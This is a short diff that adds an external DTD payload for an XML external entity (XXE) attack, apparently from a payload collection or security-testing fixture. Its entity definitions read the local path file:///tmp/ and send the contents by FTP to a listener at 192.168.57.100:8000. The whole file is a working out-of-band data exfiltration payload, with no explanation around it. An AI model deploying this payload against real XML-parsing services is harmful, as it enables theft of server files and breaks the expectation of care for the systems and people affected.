@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "file:///tmp/">
+<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "ftp://%payload;:aaa@192.168.57.100:8000/">'>
+%param1;
+%external;
